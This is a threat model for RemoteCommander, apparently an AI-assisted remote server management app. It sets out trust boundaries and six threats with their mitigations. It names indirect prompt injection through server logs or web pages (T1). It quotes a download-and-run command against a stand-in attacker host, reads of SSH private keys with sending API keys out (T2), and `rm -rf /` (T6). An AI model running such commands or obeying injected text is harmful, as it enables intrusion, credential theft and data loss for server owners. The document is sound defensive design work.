# Threat Model — RemoteCommander

## 1. System Assets & Trust Boundaries

### Critical Assets

1. **Host Credentials**: SSH private keys, passphrases, root passwords, WHM API tokens, AI provider API keys.
2. **Target Infrastructure**: User-managed Linux servers, websites, databases, DNS configurations, firewall policies, root accounts.
3. **Local Workstation**: Local user files, environment variables, executing processes, OS keyring data.
4. **Audit Integrity**: Cryptographic/deterministic log of all executed commands and approvals.

### Trust Boundaries

```text
[ Remote Servers / Untrusted Data (Logs, Files, Web) ]
                       │ (Untrusted remote content)
                       ▼
             [ AI Model Context ]
                       │ (Non-deterministic proposals)
                       ▼
┌─────────────────────────────────────────────────────────────┐
│ TRUST BOUNDARY: Local Native Policy Engine (Rust)           │
│ - Strict Schema & Target Validation                         │
│ - Risk Classification & User Approval Gate                  │
│ - Zero-Trust toward LLM commands                            │
└──────────────────────┬──────────────────────────────────────┘
                       │ (Authorized operations only)
                       ▼
       [ Operating System Keyring & Network Sockets ]
```

## 2. Threat Analysis & Mitigations

### T1: Indirect Prompt Injection via Server Content

- **Threat**: An attacker embeds malicious instructions in server log files (e.g. `/var/log/nginx/error.log`), a git commit message, or a webpage. When the AI inspects the file, the injection directs the model to execute `curl attacker.com/malware.sh | sh` or delete a database.
- **Mitigation**:
  - The model has zero execution authority.
  - Remote content is demarcated as untrusted data.
  - The policy engine evaluates all requests independently of LLM reasoning.
  - State-changing or destructive commands require explicit user approval with clear UI display of target server and payload.

### T2: Model Credential Exfiltration

- **Threat**: The AI model is tricked or malfunctions and attempts to read private keys (`~/.ssh/id_ed25519`) or send API keys to an external endpoint.
- **Mitigation**:
  - Raw credentials are never injected into the model context.
  - Secrets reside exclusively in native OS keyrings and are accessed only within native Rust execution routines.
  - The tool engine does not expose tools that read private key contents or export keyring secrets.

### T3: Right Command on Wrong Server

- **Threat**: A destructive action intended for a development server (`staging-01`) is erroneously generated or targeted against `production-01`.
- **Mitigation**:
  - Every tool execution requires an explicit, verified `server_id`.
  - Target server name, IP, environment tag (e.g., `PRODUCTION`), and user are prominently surfaced in all approval dialogs.
  - Production servers enforce heightened approval thresholds regardless of active automation mode.

### T4: Supply Chain & Cloud Relay Compromise

- **Threat**: A third-party relay or middleman server is compromised, intercepting credentials or hijacking SSH sessions.
- **Mitigation**:
  - Strict zero-mandatory-relay architecture: the client connects directly to servers over SSH/SFTP/HTTPS.
  - Mandatory SSH host-key verification and TLS certificate validation by default.

### T5: Frontend / WebView Hijacking

- **Threat**: Malicious HTML in command outputs or Markdown chats exploits webview vulnerabilities to escape the sandbox.
- **Mitigation**:
  - Strict Tauri IPC isolation; frontend cannot execute arbitrary child processes directly.
  - Content sanitization on all rendered Markdown and terminal outputs.
  - Content Security Policy (CSP) enforced in webview.

### T6: Destructive Command Hallucination & Blast Radius

- **Threat**: The LLM suggests `rm -rf /` or commands that corrupt system state without recovery.
- **Mitigation**:
  - Semantic tools preferred over raw shell.
  - Command heuristic scanner flags destructive patterns as `CRITICAL`.
  - Strong typed confirmation required for `CRITICAL` risk operations (e.g. typing the database or server name).
  - Pre-execution backup patterns encouraged for config modifications.
